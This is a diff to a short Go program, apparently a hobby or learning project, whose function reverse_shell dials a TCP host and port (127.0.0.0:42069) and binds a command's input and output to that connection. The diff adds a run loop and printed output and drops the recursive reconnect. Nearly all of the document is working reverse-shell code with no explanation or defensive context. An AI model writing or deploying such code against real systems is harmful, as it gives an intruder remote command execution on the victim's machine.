@@ -1,12 +1,13 @@
 package main
 
 import ( 
+	"fmt"
 	"net"
 	"time"
 	"os/exec"
 )
 
-func reverse_shell(host string, port string) {
+func reverse_shell(host string, port string) string {
 	connection, err := net.Dial("tcp", host+":"+port)
 	if nil != err {
 		time.Sleep(5 * time.Second)
@@ -18,15 +19,16 @@ func reverse_shell(host string, port string) {
 
 	//Get user command
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = connection, connection, connection
-
-	//Launch user command and send user command output
-	cmd.Run()
-	
+	for {
+		fmt.Println(connection)
+		//Launch user command and send user command output
+		cmd.Run()
+	}
 	//Close connection
 	connection.Close()
-	reverse_shell(host, port)
+	return "Reverse shell over"
 }
 
 func main() {
-	reverse_shell("127.0.0.0", "42069")
+	fmt.Println(reverse_shell("127.0.0.0", "42069"))
 }
